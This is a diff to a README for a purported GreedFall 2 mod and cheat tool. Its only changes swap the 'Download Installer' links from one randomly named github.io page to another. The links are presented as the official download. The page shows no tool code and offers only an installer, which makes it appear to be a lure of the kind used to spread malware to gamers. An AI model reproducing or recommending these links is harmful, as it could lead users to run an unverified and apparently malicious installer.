@@ -2,7 +2,7 @@
 
 This is the GreedFall 2 Mod Tool Enhanced, designed for players looking to customize and enhance their experience in GreedFall 2. With a range of features, it provides an easy way to edit saves, unlock skills, and modify gameplay elements. Whether you want to tweak stats, generate resources, or streamline progression, this tool offers a user-friendly interface for all your needs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -74,7 +74,7 @@ For more assistance, check the documentation or reach out through the community 
 
 To get the latest version of the GreedFall 2 Mod Tool Enhanced, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to all recent updates and features. Remember to always download from trusted sources to ensure security.
 
